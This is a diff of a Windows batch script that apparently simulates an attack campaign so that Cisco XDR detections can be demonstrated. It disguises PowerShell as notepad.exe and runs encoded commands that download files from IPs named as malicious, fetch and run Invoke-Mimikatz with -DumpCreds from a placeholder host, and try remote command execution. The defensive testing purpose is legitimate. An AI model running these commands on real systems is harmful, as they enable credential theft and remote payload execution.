@@ -13,9 +13,9 @@ echo.
 echo.
 echo.
 Echo The following script will trigger events from the following research:
-Echo https://circleid.com/posts/into-the-deep-dns-sea-with-the-jsceal-campaign
+Echo https://blog.talosintelligence.com/uat-9686/
 Echo.
-Echo Investigation after executing this batch file will show connections to https://foo-foo.bar, 104.21.12.37 and DNS to URL: https://reg.ru (it will actually open a webpage)
+Echo Investigation after executing this batch file will show connections to https://foo-foo.bar, 172[.]233[.]67[.]176 and DNS to URL: https://reg.ru (it will actually open a webpage)
 Echo.
 Echo.
 :: Process creates a test directory, copies powershell to that directory as notepad, the attempts to connect to a malicious URL and IP, then deletes the test directory.
@@ -29,16 +29,18 @@ copy "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "C:\test\notepa
 :: Copies powershell.exe to the newly created test directory as a notepad application
 :: Start-Process https://reg.ru
 c:\test\notepad.exe -e UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGgAdAB0AHAAcwA6AC8ALwByAGUAZwAuAHIAdQA=
-:: Starts the default browser and directs it to a benign site with ties to this attack campaigndomain
-:: powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('http://104.21.12.37/nofile.exe', 'C:\nofile.exe')"
-c:\test\notepad.exe -e IgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvADEAMAA0AC4AMgAxAC4AMQAyAC4AMwA3AC8AbgBvAGYAaQBsAGUALgBlAHgAZQAnACwAIAAnAEMAOgBcAG4AbwBmAGkAbABlAC4AZQB4AGUAJwApACIA
+:: Starts the default browser and directs it to a benign site with ties to this attack campaig domain
+:: powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('http://172.237.29.147/nofile.exe', 'C:\nofile.exe')"
+c:\test\notepad.exe -e IgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMgAzADcALgAyADkALgAxADQANwAvAG4AbwBmAGkAbABlAC4AZQB4AGUAJwAsACAAJwBDADoAXABuAG8AZgBpAGwAZQAuAGUAeABlACcAKQAiAA==
+:: powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('http://172.233.67.176/nofile.exe', 'C:\nofile.exe')"
+c:\test\notepad.exe -e IgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMgAzADMALgA2ADcALgAxADcANgAvAG4AbwBmAGkAbABlAC4AZQB4AGUAJwAsACAAJwBDADoAXABuAG8AZgBpAGwAZQAuAGUAeABlACcAKQAiAA==
 :: Attempts a HTTP web request to download a non-existing file from a malicious IP
 :: powershell.exe -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://foo-foo.bar/PowerShellMafia/PowerSpolit/f650520c5b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.pls'); Invoke-Mimikatz -DumpCreds"
 c:\test\notepad.exe -e IgBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAGYAbwBvAC0AZgBvAG8ALgBiAGEAcgAvAFAAbwB3AGUAcgBTAGgAZQBsAGwATQBhAGYAaQBhAC8AUABvAHcAZQByAFMAcABvAGwAaQB0AC8AZgA2ADUAMAA1ADIAMABjADUAYgAxADAAMAA0AGQAYQBmADgAYgAzAGUAYwAwADgAMAAwADcAYQAwAGIAOQA0ADUAYgA5ADEAMgA1ADMAYQAvAEUAeABmAGkAbAB0AHIAYQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAGwAcwAnACkAOwAgAEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6ACAALQBEAHUAbQBwAEMAcgBlAGQAcwAiAA==
 :: Attempts to invoke mimikatz from a non-existent github repository (in order to steel credentials) 
 :: Before cleanup we will add one command to make this somewhat realistic - lateral movement
-:: powershell.exe -exec bypass -enc "Invoke-Command -ComputerName 127.0.0.1 -ScriptBlock { cmd.exe /c 'whoami /all > C:\Users\Public\who.txt' } -Credential (Get-Credential)"
-c:\test\notepad.exe -e IgBJAG4AdgBvAGsAZQAtAEMAbwBtAG0AYQBuAGQAIAAtAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlACAAMQAyADcALgAwAC4AMAAuADEAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgAHsAIABjAG0AZAAuAGUAeABlACAALwBjACAAJwB3AGgAbwBhAG0AaQAgAC8AYQBsAGwAIAA+ACAAQwA6AFwAVQBzAGUAcgBzAFwAUAB1AGIAbABpAGMAXAB3AGgAbwAuAHQAeAB0ACcAIAB9ACAALQBDAHIAZQBkAGUAbgB0AGkAYQBsACAAKABHAGUAdAAtAEMAcgBlAGQAZQBuAHQAaQBhAGwAKQAiAA==
+:: powershell.exe -exec bypass -enc "Invoke-Command -ComputerName 127.0.0.1 -ScriptBlock { cmd.exe /c 'whoami /all > C:\test\who.txt' } -Credential (Get-Credential)"
+c:\test\notepad.exe -e IgBJAG4AdgBvAGsAZQAtAEMAbwBtAG0AYQBuAGQAIAAtAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlACAAMQAyADcALgAwAC4AMAAuADEAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgAHsAIABjAG0AZAAuAGUAeABlACAALwBjACAAJwB3AGgAbwBhAG0AaQAgAC8AYQBsAGwAIAA+ACAAQwA6AFwAdABlAHMAdABcAHcAaABvAC4AdAB4AHQAJwAgAH0AIAAtAEMAcgBlAGQAZQBuAHQAaQBhAGwAIAAoAEcAZQB0AC0AQwByAGUAZABlAG4AdABpAGEAbAApACIA
 :: Remove-Item "C:\test\notepad.exe" -ErrorAction SilentlyContinue; if (-not (Get-ChildItem "C:\test" -Force)) { Remove-Item "C:\test" }
 powershell.exe -e UgBlAG0AbwB2AGUALQBJAHQAZQBtACAAIgBDADoAXAB0AGUAcwB0AFwAbgBvAHQAZQBwAGEAZAAuAGUAeABlACIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAOwAgAGkAZgAgACgALQBuAG8AdAAgACgARwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgACIAQwA6AFwAdABlAHMAdAAiACAALQBGAG8AcgBjAGUAKQApACAAewAgAFIAZQBtAG8AdgBlAC0ASQB0AGUAbQAgACIAQwA6AFwAdABlAHMAdAAiACAAfQA=
 :: removes the notepad.exe file from the c:\test directory and directory if empty
@@ -53,11 +55,12 @@ echo.
 echo Script completed successfully. Pressing any key will close this window...
 echo.
 echo.
-echo To demonstrate this capability, go to google and search for "DNS jsceal". Select the top result. Querry this page for observables using the Cisco XDR plug-in. Click the investigation button. XDR will show matches to this attack including each computer this batch runs on. This is an example of using an XDR to threat hunt and find a successfull hit. 
+echo To demonstrate this capability, google "talos blog UAT-9686" and go to the top result (https://blog.talosintelligence.com/uat-9686/). Querry this page for observables using the Cisco XDR plug-in. Click the investigation button. XDR will show matches to this attack including each computer this batch runs on. This is an example of using an XDR to threat hunt and find a successfull hit. 
 echo.
 echo.
 pause
 Exit
+
 
 
 
